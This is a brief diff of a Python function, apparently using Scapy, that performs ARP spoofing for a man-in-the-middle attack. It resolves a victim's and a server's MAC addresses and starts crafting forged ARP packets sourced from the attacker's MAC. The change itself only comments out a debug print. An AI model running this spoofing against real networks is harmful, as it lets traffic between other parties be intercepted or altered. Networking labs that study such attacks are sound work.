@@ -18,7 +18,7 @@ def MIMspoofARP(ipVictim, ipServer):
     macVictim = getmacbyip(ipVictim)
     macServer = getmacbyip(ipServer)
 
-    print(f'ipVictim={ipVictim}, macVictim={macVictim}, ipServer={ipServer}, macServer={macServer}')
+    # print(f'ipVictim={ipVictim}, macVictim={macVictim}, ipServer={ipServer}, macServer={macServer}')
 
     arpTo = Ether() / ARP()
     arpTo[Ether].src = macAttacker
